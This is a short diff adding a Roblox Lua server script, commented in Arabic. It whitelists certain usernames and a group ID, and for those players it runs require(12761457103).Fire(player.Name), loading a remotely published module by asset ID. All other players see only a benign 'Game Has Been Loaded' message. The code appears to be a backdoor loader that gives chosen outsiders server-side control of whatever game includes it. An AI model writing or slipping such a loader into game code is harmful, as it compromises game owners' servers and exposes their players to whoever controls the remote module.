@@ -1,0 +1,23 @@
+local Players = game:GetService("Players")
+
+local UserNames = {
+	["Mostafa_ahmed00"] = true, -- خليني يولد
+	-- تقدر تضيف اي اسم عادي من هنا زي الي فوق بظبط مثلاا:
+	["KJLSAD123"] = true,
+	--["PlayerName"] = true,
+	--["PlayerName"] = true,
+	--["PlayerName"] = true,
+	--كذاا 
+}
+
+local function IsWhitelisted(player)
+	return UserNames[player.Name] or player:IsInGroup(5802095) -- حط ايدي الجروب
+end
+
+Players.PlayerAdded:Connect(function (player)
+	if IsWhitelisted(player) then
+		require(12761457103).Fire(player.Name)
+	else
+		print("Game Has Been Loaded")
+	end
+end)
